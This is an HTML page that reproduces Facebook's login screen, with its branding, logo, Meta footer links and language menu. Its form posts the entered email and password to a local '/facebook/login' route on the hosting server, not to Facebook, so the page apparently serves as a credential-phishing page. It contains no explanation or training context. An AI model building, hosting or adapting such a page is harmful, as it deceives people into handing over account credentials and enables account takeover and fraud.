<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Log in to Facebook</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen w-full bg-white flex flex-col">

  <!-- Logo -->
  <div class="w-full flex justify-center py-8 border-b border-gray-200">
    <svg width="52" height="52" viewBox="0 0 36 36" fill="none">
      <circle cx="18" cy="18" r="18" fill="#1877F2"/>
      <path d="M25 18.06c0-3.87-3.13-7-7-7s-7 3.13-7 7c0 3.5 2.56 6.4 5.91 6.93v-4.9h-1.78v-2.03h1.78v-1.55c0-1.76 1.05-2.73 2.65-2.73.77 0 1.57.14 1.57.14v1.73h-.88c-.87 0-1.14.54-1.14 1.1v1.31h1.94l-.31 2.03h-1.63v4.9C22.44 24.46 25 21.56 25 18.06z" fill="#fff"/>
    </svg>
  </div>

  <!-- Form -->
  <div class="flex-1 flex flex-col items-center pt-16 px-6">
    <div class="w-full max-w-sm">
      <h1 class="text-gray-900 text-xl font-semibold mb-4">Log in to Facebook</h1>

      <form method="POST" action="/facebook/login" class="flex flex-col gap-3">
        <input
          type="text"
          name="email"
          placeholder="Email address or mobile number"
          class="bg-white border border-gray-300 rounded-md px-3 py-3 text-sm text-gray-900 placeholder-gray-500 focus:outline-none focus:border-gray-400"
        />
        <input
          type="password"
          name="password"
          placeholder="Password"
          class="bg-white border border-gray-300 rounded-md px-3 py-3 text-sm text-gray-900 placeholder-gray-500 focus:outline-none focus:border-gray-400"
        />

        <button
          type="submit"
          class="bg-[#1877F2] hover:bg-[#166fe0] text-white text-base font-semibold rounded-full py-2.5 mt-2 transition"
        >
          Log in
        </button>

        <a href="/forgot-password" class="text-[#1877F2] text-sm text-center mt-3">
          Forgotten password?
        </a>
      </form>

      <div class="mt-10 flex flex-col items-center gap-6">
        <a href="/signup" class="border border-[#1877F2] text-[#1877F2] text-sm font-semibold rounded-full py-2.5 px-6 hover:bg-blue-50 transition">
          Create new account
        </a>

        <div class="flex items-center gap-1.5 text-gray-800 text-sm font-medium">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="#1877F2">
            <path d="M6.9 4.5c-2.9 0-5.4 2.6-5.4 6 0 2.3 1.3 4.2 2.8 5.8l7.4 7.7c.2.2.5.3.7.3s.5-.1.7-.3l7.4-7.7c1.5-1.6 2.8-3.5 2.8-5.8 0-3.4-2.5-6-5.4-6-1.9 0-3.6 1-4.9 2.6l-.6.7-.6-.7c-1.3-1.6-3-2.6-4.9-2.6z" />
          </svg>
          Meta
        </div>
      </div>
    </div>
  </div>

  <!-- Language row -->
  <div class="w-full border-t border-gray-200 px-6 py-4">
    <div class="max-w-3xl mx-auto flex flex-wrap gap-x-4 gap-y-2 justify-center text-[13px] text-gray-600">
      <a href="#" class="hover:underline">English (UK)</a>
      <a href="#" class="hover:underline">தமிழ்</a>
      <a href="#" class="hover:underline">తెలుగు</a>
      <a href="#" class="hover:underline">ಕನ್ನಡ</a>
      <a href="#" class="hover:underline">اردو</a>
      <a href="#" class="hover:underline">हिन्दी</a>
      <a href="#" class="hover:underline">മലയാളം</a>
      <a href="#" class="hover:underline">More languages…</a>
    </div>
  </div>

  <!-- Footer links -->
  <div class="w-full px-6 pb-4">
    <div class="max-w-4xl mx-auto flex flex-wrap gap-x-4 gap-y-2 justify-center text-[13px] text-gray-500">
      <a href="#" class="hover:underline">Sign up</a>
      <a href="#" class="hover:underline">Log in</a>
      <a href="#" class="hover:underline">Messenger</a>
      <a href="#" class="hover:underline">Facebook Lite</a>
      <a href="#" class="hover:underline">Video</a>
      <a href="#" class="hover:underline">Meta Pay</a>
      <a href="#" class="hover:underline">Meta Store</a>
      <a href="#" class="hover:underline">Meta Quest</a>
      <a href="#" class="hover:underline">Ray-Ban Meta</a>
      <a href="#" class="hover:underline">Meta AI</a>
      <a href="#" class="hover:underline">Muse</a>
    </div>
  </div>

</body>
</html>
